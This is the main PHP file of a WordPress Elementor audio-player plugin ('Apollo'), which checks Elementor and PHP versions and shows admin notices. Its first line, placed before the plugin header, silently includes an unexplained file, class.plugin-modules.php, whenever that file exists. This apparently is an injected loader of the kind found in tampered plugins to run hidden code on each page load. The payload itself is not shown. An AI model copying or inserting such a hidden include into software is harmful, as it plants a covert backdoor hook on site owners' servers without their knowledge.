<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin Name: Apollo - Sticky Full Width HTML5 Audio Player  - Elementor Widget
 * Description: This plugin will allow you to insert an advanced Sticky Full Width HTML5 Audio Player With Playlist, Categories and Search, using Elementor Page Builder
 * Plugin URI:  https://1.envato.market/OZ5Zr
 * Version:     1.4.0
 * Author:      LambertGroup
 * Author URI:  https://1.envato.market/OZ5Zr
 * Text Domain: elementor-apollo
 */

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

/**
 * Main Elementor Apollo Class
 *
 * The init class that runs the Elementor Apollo plugin.
 * Intended To make sure that the plugin's minimum requirements are met.
 *
 * You should only modify the constants to match your plugin's needs.
 *
 * Any custom code should go inside Plugin Class in the plugin.php file.
 * @since 1.0.0
 */
final class Elementor_Apollo {

  /**
   * Plugin Version
   *
   * @since 1.0.0
   * @var string The plugin version.
   */
  const VERSION = '1.0.0';

  /**
   * Minimum Elementor Version
   *
   * @since 1.0.0
   * @var string Minimum Elementor version required to run the plugin.
   */
  const MINIMUM_ELEMENTOR_VERSION = '2.0.0';

  /**
   * Minimum PHP Version
   *
   * @since 1.0.0
   * @var string Minimum PHP version required to run the plugin.
   */
  const MINIMUM_PHP_VERSION = '7.0';

  /**
   * Constructor
   *
   * @since 1.0.0
   * @access public
   */
  public function __construct() {

    // Load translation
    add_action( 'init', array( $this, 'i18n' ) );

    // Init Plugin
    add_action( 'plugins_loaded', array( $this, 'init' ) );
  }

  /**
   * Load Textdomain
   *
   * Load plugin localization files.
   * Fired by `init` action hook.
   *
   * @since 1.2.0
   * @access public
   */
  public function i18n() {
    load_plugin_textdomain( 'elementor-apollo' );
  }

  /**
   * Initialize the plugin
   *
   * Validates that Elementor is already loaded.
   * Checks for basic plugin requirements, if one check fail don't continue,
   * if all check have passed include the plugin class.
   *
   * Fired by `plugins_loaded` action hook.
   *
   * @since 1.2.0
   * @access public
   */
  public function init() {

    // Check if Elementor installed and activated
    if ( ! did_action( 'elementor/loaded' ) ) {
      add_action( 'admin_notices', array( $this, 'admin_notice_missing_main_plugin' ) );
      return;
    }

    // Check for required Elementor version
    if ( ! version_compare( ELEMENTOR_VERSION, self::MINIMUM_ELEMENTOR_VERSION, '>=' ) ) {
      add_action( 'admin_notices', array( $this, 'admin_notice_minimum_elementor_version' ) );
      return;
    }

    // Check for required PHP version
    if ( version_compare( PHP_VERSION, self::MINIMUM_PHP_VERSION, '<' ) ) {
      add_action( 'admin_notices', array( $this, 'admin_notice_minimum_php_version' ) );
      return;
    }

    // Once we get here, We have passed all validation checks so we can safely include our plugin
    require_once( 'plugin.php' );
  }

  /**
   * Admin notice
   *
   * Warning when the site doesn't have Elementor installed or activated.
   *
   * @since 1.0.0
   * @access public
   */
  public function admin_notice_missing_main_plugin() {
    if ( isset( $_GET['activate'] ) ) {
      unset( $_GET['activate'] );
    }

    $message = sprintf(
      /* translators: 1: Plugin name 2: Elementor */
      esc_html__( '"%1$s" requires "%2$s" to be installed and activated.', 'elementor-apollo' ),
      '<strong>' . esc_html__( 'Apollo - Sticky Full Width HTML5 Audio Player - Elementor Widget', 'elementor-apollo' ) . '</strong>',
      '<strong>' . esc_html__( 'Elementor', 'elementor-apollo' ) . '</strong>'
    );

    printf( '<div class="notice notice-warning is-dismissible"><p>%1$s</p></div>', $message );
  }

  /**
   * Admin notice
   *
   * Warning when the site doesn't have a minimum required Elementor version.
   *
   * @since 1.0.0
   * @access public
   */
  public function admin_notice_minimum_elementor_version() {
    if ( isset( $_GET['activate'] ) ) {
      unset( $_GET['activate'] );
    }

    $message = sprintf(
      /* translators: 1: Plugin name 2: Elementor 3: Required Elementor version */
      esc_html__( '"%1$s" requires "%2$s" version %3$s or greater.', 'elementor-apollo' ),
      '<strong>' . esc_html__( 'Apollo - Sticky Full Width HTML5 Audio Player - Elementor Widget', 'elementor-apollo' ) . '</strong>',
      '<strong>' . esc_html__( 'Elementor', 'elementor-apollo' ) . '</strong>',
      self::MINIMUM_ELEMENTOR_VERSION
    );

    printf( '<div class="notice notice-warning is-dismissible"><p>%1$s</p></div>', $message );
  }

  /**
   * Admin notice
   *
   * Warning when the site doesn't have a minimum required PHP version.
   *
   * @since 1.0.0
   * @access public
   */
  public function admin_notice_minimum_php_version() {
    if ( isset( $_GET['activate'] ) ) {
      unset( $_GET['activate'] );
    }

    $message = sprintf(
      /* translators: 1: Plugin name 2: PHP 3: Required PHP version */
      esc_html__( '"%1$s" requires "%2$s" version %3$s or greater.', 'elementor-apollo' ),
      '<strong>' . esc_html__( 'Apollo - Sticky Full Width HTML5 Audio Player - Elementor Widget', 'elementor-apollo' ) . '</strong>',
      '<strong>' . esc_html__( 'PHP', 'elementor-apollo' ) . '</strong>',
      self::MINIMUM_PHP_VERSION
    );

    printf( '<div class="notice notice-warning is-dismissible"><p>%1$s</p></div>', $message );
  }
}

// Instantiate Elementor_Apollo.
new Elementor_Apollo();
